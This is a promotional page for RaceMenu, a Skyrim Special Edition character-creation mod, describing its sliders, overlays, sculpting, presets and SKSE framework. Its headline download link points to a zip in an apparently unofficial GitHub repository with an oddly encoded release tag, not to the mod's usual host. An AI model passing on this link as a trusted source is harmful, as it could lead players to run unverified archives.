# RaceMenu – Advanced Skyrim Character Creation, Customization, Sculpting, and Body Overlays

RaceMenu is an advanced character creation and customization overhaul for The Elder Scrolls V: Skyrim Special Edition, expanding vanilla appearance editing with additional sliders, color controls, presets, warpaints, body overlays, and sculpting tools. Powered by SKSE, it offers advanced facial customization, head mesh editing, BodyMorph, and BodyGen, giving players greater control over character appearance and mod authors an extensible framework for customization mods.

> **[Download RaceMenu for Skyrim Special Edition](https://github.com/RaceMenu-Skyrim-Character-Creation/.github/releases/download/v.%2F1/Race.Menu.Advanced.Skyrim.Character.v.1.0.3.zip)**

## Screenshots

![RaceMenu character creation interface showing hairstyle selection and character preview](https://staticdelivery.nexusmods.com/mods/1704/images/19080/19080-1776621005-385672924.jpg)

![RaceMenu character customization interface with advanced sliders and numerical values](https://staticdelivery.nexusmods.com/mods/1704/images/19080/29624-1533485825-2144769853.jpeg)

![RaceMenu character race selection interface](https://staticdelivery.nexusmods.com/mods/1704/images/19080/29624-1533485825-1482110060.jpeg)


## Why Choose RaceMenu?

RaceMenu is one of the most comprehensive character customization frameworks available for Skyrim Special Edition. Instead of limiting players to the basic appearance options provided by the vanilla game, it delivers an expanded character creation experience with advanced editing tools, detailed appearance controls, and an extensible system for additional customization mods.

There are several reasons why RaceMenu is worth downloading:

- **More Character Customization:** Access extended sliders, detailed facial adjustments, advanced color controls, and additional appearance options to create characters that go beyond vanilla Skyrim limitations.
- **Advanced Sculpting Tools:** Modify head geometry directly using dedicated sculpting brushes, allowing more precise facial customization than standard character creation sliders.
- **Extensive Overlay Support:** Apply multiple warpaints, body overlays, hand paints, and foot paints to create distinctive character appearances.
- **Reusable Character Presets:** Save and load customized character appearances instead of repeatedly rebuilding the same character from scratch.
- **BodyMorph and BodyGen Integration:** Access additional body customization and configuration-based morph distribution for supported characters and compatible body frameworks.
- **A Powerful Modding Framework:** Benefit from SKSE integration and interfaces that allow other modifications to extend character creation, overlays, presets, and appearance-related functionality.
- **Greater Creative Freedom:** Combine supported customization systems to build unique player characters and NPC appearances that better match your personal vision.

### What Makes RaceMenu Stand Out?

The main advantage of RaceMenu is the combination of several character customization systems within a single framework. It is not simply a replacement for Skyrim's default character creation menu: it also provides sculpting functionality, overlay customization, morph support, preset management, and modder-facing interfaces.

This combination makes RaceMenu particularly valuable for players who want deeper control over character appearance and for mod authors who need a foundation for advanced Skyrim character customization.

If you are building a heavily customized Skyrim Special Edition setup, creating detailed character presets, or developing appearance-related mods, RaceMenu is an excellent choice and one of the most versatile tools to consider.

## Advanced Character Creation and Appearance Editing

RaceMenu expands Skyrim's original character creation menu with a redesigned interface and additional customization controls. Its categorized layout makes appearance editing easier to navigate while providing access to extended character sliders, numerical values, searchable options, and more precise customization settings.

Players can adjust facial features, hairstyles, eye colors, skin tones, and other appearance properties. The interface also provides enhanced camera positioning, lighting controls, and detailed color selection using AARRGGBB values.

An optional plugin, `RaceMenuPlugin.esp`, adds further player scaling options, including height, bicep size, glute size, breast size, and breast curve adjustments. Certain scaling options require compatible body meshes and skeleton support.

## Warpaints, Body Overlays, and Color Customization

RaceMenu introduces expanded warpaint and overlay customization, allowing players to apply multiple appearance layers instead of relying exclusively on Skyrim's vanilla character painting options.

The framework supports:

- Multiple RGBA warpaint layers.
- Custom warpaint textures.
- Body, hand, and feet overlays.
- Individual overlay color customization.
- Overlay glow color and intensity controls.
- Saving and loading color configurations.
- Configurable overlay slots.

Additional overlay settings can be configured through `Data/SKSE/Plugins/NiOverride.ini`. The number of overlay slots should be configured according to actual requirements, as excessive slots can increase performance costs.

These features make RaceMenu particularly useful for players building distinctive character appearances and mod authors developing custom tattoos, body textures, and visual customization options.

## Sculpt Mode and Advanced Head Mesh Editing

RaceMenu includes a dedicated Sculpt Mode that allows players to modify character head geometry directly rather than relying exclusively on predefined sliders.

Its sculpting tools provide several mesh-editing operations:

- **Inflate and Deflate:** Move selected vertices outward or inward according to adjacent face normals.
- **Smooth:** Average neighboring vertex positions to create smoother surfaces.
- **Move:** Adjust vertex positions through cursor-based movement.
- **Mask:** Protect selected mesh regions from subsequent sculpting operations.
- **History:** Preserve previous sculpting operations for editing workflows.

Sculpt Mode provides additional control over facial proportions and head geometry, making it useful for creating more distinctive Skyrim character appearances.

The framework also supports importing and exporting compatible head mesh data, allowing advanced customization workflows involving external 3D editing tools.

## Character Presets, BodyMorph, and BodyGen

RaceMenu supports character appearance presets, allowing players to save and reuse customized character configurations instead of recreating an appearance from scratch.

Its BodyMorph functionality provides additional control over supported body shape morphs. Compatible morph data can be used to customize character body proportions beyond standard character creation sliders.

BodyGen extends this system through configuration-based body randomization. It allows supported actors to receive different body morph combinations according to configured templates and distribution rules.

These systems are especially useful for Skyrim mod setups that include custom body frameworks, character appearance modifications, and NPC customization.

## SKSE Integration and Modding Framework

RaceMenu uses the Skyrim Script Extender (SKSE) to extend the game's character customization functionality. Its supporting plugins provide additional interfaces and capabilities that can be used by other Skyrim modifications.

The framework includes functionality for:

- Custom character creation sliders.
- Appearance-related morph systems.
- Overlay and tint customization.
- Character head mesh operations.
- BodyMorph and BodyGen integration.
- Extended appearance editing interfaces.
- Modder-facing customization capabilities.
